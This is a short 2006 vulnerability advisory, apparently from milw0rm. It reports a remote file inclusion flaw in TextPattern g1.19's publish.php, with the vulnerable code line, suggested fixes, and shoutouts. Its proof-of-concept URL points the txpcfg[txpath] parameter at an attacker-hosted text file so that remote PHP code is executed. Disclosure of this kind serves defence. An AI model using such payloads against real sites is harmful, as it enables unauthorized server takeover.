@@ -1,0 +1,60 @@
+----------------------------------------------------------------------------
+TextPattern <=g1.19 (txpcfg[txpath]) Remote File Inclusion Vulnerability
+----------------------------------------------------------------------------
+
+Author		: Zeni Susanto A.K.A Bithedz
+Date Found	: October, 25th 2006
+Location	: Indonesia,Bandung
+Critical Lvl	: Highly critical
+Impact		: System access
+Where		: From Remote
+---------------------------------------------------------------------------
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Application	: TextPattern
+version		: <=g1.19
+URL		: http://textpattern.com/deanload/textpattern_g119.zip
+
+textpattern is A free, flexible, elegant, easy-to-use content management system for all kinds of websites, even weblogs.
+
+
+---------------------------------------------------------------------------
+
+Vulnerability:
+~~~~~~~~~~~
+
+In file publish.php I found vulnerability script
+--------------------------publish.php---------------------------------------
+define("txpath",$txpcfg['txpath']); 
+----------------------------------------------------------------------------
+
+Input passed to the "txpcfg['txpath']" parameter in publish.php is not
+properly verified before being used. This can be exploited to execute
+arbitrary PHP code by including files from local or external
+resources.
+
+
+Proof Of Concept:
+~~~~~~~~~~~~
+http://yourtargetsite/[textpattern_g119_path]/textpattern/publish.php?txpcfg[txpath]=http://attact/colok.txt?
+Solution:
+~~~~
+- Sanitize variable $txpcfg['txpath'] on affected files.
+- Turn off register_globals
+
+---------------------------------------------------------------------------
+
+Shoutz:
+~
+~ K-159
+~ Monik My Brain
+~ #bridge (silent) @irc.dal.net
+------------------------------------------------------------------------
+---
+Contact:
+~
+bithedz[at]gmail[dot]com
+
+# milw0rm.com [2006-10-25]
